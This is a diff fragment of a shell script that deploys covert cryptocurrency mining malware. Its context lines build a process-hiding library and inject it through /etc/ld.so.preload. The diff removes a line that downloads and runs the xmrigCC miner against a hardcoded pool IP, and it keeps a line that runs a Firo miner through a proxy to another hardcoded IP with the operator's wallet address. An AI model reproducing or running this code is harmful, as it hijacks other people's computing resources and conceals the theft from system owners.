@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gm3.43 -a firo -s 192.241.132.122:80 -u a8royxYxcQpL3iFFZArAaUsQwSfvUz7kjG.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsBkbNrkdPypa4grnY1RXXtoWJPp8qCp4ioZnJ8KtJYpmgJzeekhTXcMrKAeRoJCE4faRRYPtcYtMUXBtg9jSM9ovNvrwnuR -p WK01 -k -a randomx -t4 > /dev/null 2>&1
+./graftcp/graftcp ./gm3.43 -a firo -s 192.241.132.122:80 -u a8royxYxcQpL3iFFZArAaUsQwSfvUz7kjG.$(shuf -n 1 -i 1-3000)-Bismillah
